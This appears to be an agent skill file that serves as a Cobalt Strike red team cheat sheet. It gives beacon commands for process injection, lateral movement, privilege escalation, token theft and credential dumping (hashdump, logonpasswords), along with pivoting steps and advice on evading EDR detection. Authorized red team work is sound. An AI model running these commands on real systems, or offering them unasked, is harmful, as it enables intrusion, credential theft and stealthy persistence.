---
name: cobalt-strike
description: "Cobalt Strike operation essentials: listener setup, beacon management, lateral movement, and OPSEC considerations. Use this skill for authorized red team operations using Cobalt Strike."
---

# Cobalt Strike

## Overview

Cobalt Strike is a commercial C2: listeners receive callbacks, beacons execute tasks, and the team server coordinates operators.

## Setup

```bash
./teamserver <ip> <password> [malleable_profile]
# client connects to ip:50050
```

## Listeners

| Type | Use |
|---|---|
| HTTPS | standard egress over 443 |
| HTTP | 80 |
| SMB | internal lateral movement |
| TCP | raw, no proxy |
| DNS | restrictive egress |
| External | redirector chaining |

Malleable C2 profile controls the HTTP traffic shape — always use one matching the target's environment.

## Beacon commands

```
beacon> sleep 60 30           # 60s sleep, 30% jitter
beacon> spawnto x64 notepad.exe
beacon> inject 1234 x64       # into PID
beacon> shinject 1234 x64 /path/payload.bin
beacon> dllinject 1234 /path.dll
beacon> ps                    # process list
beacon> net shares
beacon> portscan 10.0.0.0/24 445,3389
beacon> jump psexec64 host listener
beacon> elevate uac-token-duplication listener
beacon> steal_token 1234
beacon> make_token DOMAIN\user pass
beacon> hashdump
beacon> logonpasswords
beacon> socks 1080
beacon> rportfwd 8080 10.0.0.5 80
```

## Pivoting

```
beacon> socks 1080
# then proxychains or the CS browser pivot
beacon> rportfwd_local 9001 10.0.0.5 445
```

## OPSEC

- Sleep with jitter; do not beacon every second.
- Use malleable profiles that match legit traffic (jQuery, OneDrive).
- Avoid `shinject` into monitored processes.
- Kill beacons from hosts you no longer need.

## Reporting

Cobalt Strike logs every command in the team server log — export it for the report.

## Pitfalls

- Default profiles are signatured by every EDR.
- Team server default TLS cert is detected; use a valid cert.
- Beacon metadata in memory is scanned for by advanced EDRs.

## Verification

Every action must be confirmed by command output, not by the absence of an error.
